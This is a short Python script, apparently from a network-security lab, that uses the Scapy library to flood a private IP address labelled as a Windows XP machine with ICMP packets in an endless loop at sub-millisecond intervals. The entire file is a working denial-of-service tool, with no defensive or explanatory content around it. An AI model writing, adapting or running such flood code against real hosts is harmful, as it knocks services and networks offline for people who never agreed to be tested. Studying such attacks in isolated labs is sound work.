from scapy.all import *

target = "192.168.40.126" # Windows XP IP

print(f"Starting ICMP FLOOD against: {target}")
print("Press CTRL+C to stop")

packet = IP(dst=target)/ICMP()

send(packet, loop=1, inter=0.0005, verbose=False)